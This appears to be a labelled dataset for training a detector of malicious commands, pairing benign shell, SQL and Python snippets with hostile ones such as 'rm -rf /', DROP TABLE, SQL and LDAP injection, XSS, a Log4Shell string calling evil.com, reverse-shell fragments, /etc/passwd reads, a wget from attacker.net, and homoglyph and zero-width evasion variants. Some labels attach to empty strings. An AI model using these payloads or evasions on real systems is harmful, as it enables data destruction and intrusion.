+{"text": " || echo success", "label": 1, "category": "network_scanning"}
+{"text": "Can  you  help  me  with  this?", "label": 0, "category": "benign_text"}
+{"text": "; shell_exec", "label": 1, "category": "shell_execution"}
+{"text": "; ../", "label": 1, "category": "path_traversal"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\nDELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": "#  TODO:  Remove  debug  line:  system('ls')", "label": 0, "category": "benign_hard"}
+{"text": "python -c \"eval(\"", "label": 1, "category": "code_execution"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "REM chmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "perl -e '..\\'", "label": 1, "category": "path_traversal_windows"}
+{"text": " ", "label": 1, "category": "credential_dumping"}
+{"text": "chmod 777 // bypass", "label": 1, "category": "permission_escalation"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "powershell -Command \"DROP TABLE\"", "label": 1, "category": "sql_destructive"}
+{"text": "words  =  'hello  world'.split()", "label": 0, "category": "benign_python"}
+{"text": "name  =  'John  Doe'", "label": 0, "category": "benign_python"}
+{"text": "#\nTRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  u.name,  o.total  FROM  users  u  JOIN  orders  o  ON  u.id  =  o.user_id", "label": 0, "category": "benign_sql"}
+{"text": "result  =  'test'.replace('t',  'T')", "label": 0, "category": "benign_python"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " // bypass", "label": 1, "category": "sql_time_based"}
+{"text": "# head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "cmd /c system(", "label": 1, "category": "system_call"}
+{"text": "echo 'shell_exec'", "label": 1, "category": "shell_execution"}
+{"text": "What  is  the  difference  between  X  and  Y?", "label": 0, "category": "benign_text"}
+{"text": " ", "label": 1, "category": "sql_time_based"}
+{"text": "-- popen(", "label": 1, "category": "process_execution"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "node -e \"DROP TABLE\"", "label": 1, "category": "sql_destructive"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "-- /etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "import  os", "label": 0, "category": "benign_python"}
+{"text": "../ ; echo success", "label": 1, "category": "path_traversal"}
+{"text": "exec(system()", "label": 1, "category": "system_call"}
+{"text": "/* rm -rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "bash -c 'bash -i'", "label": 1, "category": "interactive_shell"}
+{"text": "df  -h", "label": 0, "category": "benign_shell"}
+{"text": "sort  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "print('Hello')", "label": 0, "category": "benign_python"}
+{"text": "../ /* bypass", "label": 1, "category": "path_traversal"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec( REM bypass", "label": 1, "category": "code_execution"}
+{"text": "#\n..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": ";\nDELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": "SELECT category, COUNT(*) FROM products GROUP BY category", "label": 0, "category": "benign_sql"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": "cmd /c ", "label": 1, "category": "network_scanning"}
+{"text": "python -c \"popen(\"", "label": 1, "category": "process_execution"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!--\n/dev/tcp", "label": 1, "category": "tcp_redirection"}
+{"text": "EVAL(", "label": 1, "category": "code_execution"}
+{"text": "eval()", "label": 1, "category": "keylogger_installation"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION SELECT ", "label": 1, "category": "sql_injection"}
+{"text": "--\n", "label": 1, "category": "network_scanning"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# date", "label": 0, "category": "benign_shell"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# echo 'Hello World'", "label": 0, "category": "benign_shell"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "//\neval(", "label": 1, "category": "code_execution"}
+{"text": "INSERT  INTO  users  (name,  email)  VALUES  ('John',  'john@example.com')", "label": 0, "category": "benign_sql"}
+{"text": "DELETE+FROM", "label": 1, "category": "sql_deletion"}
+{"text": "How  does  this  function  work?", "label": 0, "category": "benign_text"}
+{"text": "ls  -R", "label": 0, "category": "benign_shell"}
+{"text": "/etc/passwd ; bypass", "label": 1, "category": "sensitive_file_access"}
+{"text": "sh -c \"rm -rf\"", "label": 1, "category": "destructive_file_operation"}
+{"text": "grep  'pattern'  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "What  time  is  it?", "label": 0, "category": "benign_text"}
+{"text": "bash -i ", "label": 1, "category": "interactive_shell"}
+{"text": "perl -e ''", "label": 1, "category": "reverse_shell"}
+{"text": "; '; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "ruby -e \"/etc/shadow\"", "label": 1, "category": "sensitive_file_access"}
+{"text": "-- ../", "label": 1, "category": "path_traversal"}
+{"text": "ls -lh", "label": 0, "category": "benign_shell"}
+{"text": "Can  you  help  me  with  this?", "label": 0, "category": "benign_text"}
+{"text": "data  =  json.load(open('data.json'))", "label": 0, "category": "benign_python"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": "result  =  system_check.is_healthy()", "label": 0, "category": "benign_hard"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP+TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "What time is it?", "label": 0, "category": "benign_text"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "perl -e ''", "label": 1, "category": "credential_dumping"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm -rf // bypass", "label": 1, "category": "destructive_file_operation"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os", "label": 0, "category": "benign_python"}
+{"text": "What is the difference between X and Y?", "label": 0, "category": "benign_text"}
+{"text": "shell_exec ; echo success", "label": 1, "category": "shell_execution"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM ", "label": 1, "category": "reverse_shell"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "bash -i REM bypass", "label": 1, "category": "interactive_shell"}
+{"text": "# ../", "label": 1, "category": "path_traversal"}
+{"text": "#\n", "label": 1, "category": "sql_time_based"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "cmd /c chmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "<!--\nrm -rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "numbers  =  [1,  2,  3,  4,  5]", "label": 0, "category": "benign_python"}
+{"text": "sh -c \"\"", "label": 1, "category": "network_scanning"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uniq  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "popen( ; echo success", "label": 1, "category": "process_execution"}
+{"text": "UPDATE  users  SET  last_login  =  NOW()  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "UNION SELECT | echo success", "label": 1, "category": "sql_injection"}
+{"text": "REM ", "label": 1, "category": "sql_comment_bypass"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "REM\n", "label": 1, "category": "ransomware_pattern"}
+{"text": "..\\ ; echo success", "label": 1, "category": "path_traversal_windows"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": "import  math", "label": 0, "category": "benign_python"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "find  .  -name  '*.py'", "label": 0, "category": "benign_shell"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget  --spider  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# cat README.md", "label": 0, "category": "benign_shell"}
+{"text": "UNIONSELECT", "label": 1, "category": "sql_injection"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "perl -e ''; --'", "label": 1, "category": "sql_comment_injection"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "// ", "label": 1, "category": "privilege_escalation"}
+{"text": "chmod 777 -- bypass", "label": 1, "category": "permission_escalation"}
+{"text": "result = system_check.is_healthy()", "label": 0, "category": "benign_hard"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " | echo success", "label": 1, "category": "reverse_shell"}
+{"text": "DROP TABLE data;", "label": 1, "category": "sql_destructive"}
+{"text": "wget http://attacker.net/backdoor && python payload.py", "label": 1, "category": "remote_code_fetch"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!-- eval(", "label": 1, "category": "code_execution"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "with open('file.txt', 'r') as f: content = f.read()", "label": 0, "category": "benign_python"}
+{"text": "output  =  safe_eval('1+1')", "label": 0, "category": "benign_hard"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "perl -e 'wget http://'", "label": 1, "category": "remote_code_fetch"}
+{"text": "exec(chmod 777)", "label": 1, "category": "permission_escalation"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "text  =  'Hello  World'.upper()", "label": 0, "category": "benign_python"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "perl -e 'bash -i'", "label": 1, "category": "interactive_shell"}
+{"text": "rm\t-rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "dir", "label": 0, "category": "benign_shell"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "nc -e // bypass", "label": 1, "category": "reverse_shell"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": " REM bypass", "label": 1, "category": "sql_comment_bypass"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": "PASSTHRU", "label": 1, "category": "passthru_execution"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "with  open('file.txt',  'r')  as  f:  content  =  f.read()", "label": 0, "category": "benign_python"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* UNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "bash-i", "label": 1, "category": "interactive_shell"}
+{"text": "DROP TABLE REM bypass", "label": 1, "category": "sql_destructive"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "bash -c '/dev/tcp'", "label": 1, "category": "tcp_redirection"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " REM bypass", "label": 1, "category": "credential_dumping"}
+{"text": "How  can  I  improve  my  code?", "label": 0, "category": "benign_text"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "curl http:// ", "label": 1, "category": "remote_code_fetch"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# date", "label": 0, "category": "benign_shell"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can  you  help  me  with  this?", "label": 0, "category": "benign_text"}
+{"text": "# ", "label": 1, "category": "ransomware_pattern"}
+{"text": "BASH -I", "label": 1, "category": "interactive_shell"}
+{"text": "<!-- curl http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "#\nexec(", "label": 1, "category": "code_execution"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "pwd", "label": 0, "category": "benign_shell"}
+{"text": "/etc/passwd ; echo success", "label": 1, "category": "sensitive_file_access"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "; UNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sort  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "wget http:// REM bypass", "label": 1, "category": "remote_code_fetch"}
+{"text": "<!--\n", "label": 1, "category": "sql_time_based"}
+{"text": ";\n", "label": 1, "category": "sql_time_based"}
+{"text": "Show  me  an  example", "label": 0, "category": "benign_text"}
+{"text": "numbers  =  [1,  2,  3,  4,  5]", "label": 0, "category": "benign_python"}
+{"text": "-- shell_exec", "label": 1, "category": "shell_execution"}
+{"text": "exec(nc -e)", "label": 1, "category": "reverse_shell"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  products  WHERE  price  >  100", "label": 0, "category": "benign_sql"}
+{"text": "-- exec(", "label": 1, "category": "code_execution"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM /etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "whoami", "label": 0, "category": "benign_shell"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# date", "label": 0, "category": "benign_shell"}
+{"text": "dir", "label": 0, "category": "benign_shell"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "REM\n", "label": 1, "category": "keylogger_installation"}
+{"text": "What  does  this  error  mean?", "label": 0, "category": "benign_text"}
+{"text": "x  =  1  +  2", "label": 0, "category": "benign_python"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\n", "label": 1, "category": "sql_union_injection"}
+{"text": "words  =  'hello  world'.split()", "label": 0, "category": "benign_python"}
+{"text": "; chmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "What  is  the  difference  between  X  and  Y?", "label": 0, "category": "benign_text"}
+{"text": "ruby -e \"\"", "label": 1, "category": "privilege_escalation"}
+{"text": "import  sys", "label": 0, "category": "benign_python"}
+{"text": "exec( ; bypass", "label": 1, "category": "code_execution"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/*\n", "label": 1, "category": "network_scanning"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# tail -f log.txt", "label": 0, "category": "benign_shell"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "result  =  'test'.replace('t',  'T')", "label": 0, "category": "benign_python"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#\n/dev/tcp", "label": 1, "category": "tcp_redirection"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\n..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "powershell -Command \"\"", "label": 1, "category": "privilege_escalation"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"\"", "label": 1, "category": "sql_union_injection"}
+{"text": ";\n..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "name  =  'John  Doe'", "label": 0, "category": "benign_python"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# chmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "<!--\nUNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": ";\n/etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "--\npopen(", "label": 1, "category": "process_execution"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "ruby -e \"curl http://\"", "label": 1, "category": "remote_code_fetch"}
+{"text": "bash -c ''", "label": 1, "category": "privilege_escalation"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "head  -n  10  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "/*\nUNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM exec(", "label": 1, "category": "code_execution"}
+{"text": "DROP TABLE -- bypass", "label": 1, "category": "sql_destructive"}
+{"text": "print('Hello')", "label": 0, "category": "benign_python"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# popen(", "label": 1, "category": "process_execution"}
+{"text": "cat  README.md", "label": 0, "category": "benign_shell"}
+{"text": "bash -c ''; --'", "label": 1, "category": "sql_comment_injection"}
+{"text": "python -c \"/etc/passwd\"", "label": 1, "category": "sensitive_file_access"}
+{"text": "// /etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "Can  you  help  me  with  this?", "label": 0, "category": "benign_text"}
+{"text": "x  =  1  +  2", "label": 0, "category": "benign_python"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": "nc\n-e", "label": 1, "category": "reverse_shell"}
+{"text": "node -e \"shell_exec\"", "label": 1, "category": "shell_execution"}
+{"text": "eval( ", "label": 1, "category": "code_execution"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "cat  README.md", "label": 0, "category": "benign_shell"}
+{"text": "date", "label": 0, "category": "benign_shell"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  name,  email  FROM  users", "label": 0, "category": "benign_sql"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "TRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!--\nwget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "head  -n  10  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/dev/tcp /* bypass", "label": 1, "category": "tcp_redirection"}
+{"text": "/*\nnc -e", "label": 1, "category": "reverse_shell"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "print('Hello')", "label": 0, "category": "benign_python"}
+{"text": "import  sys", "label": 0, "category": "benign_python"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
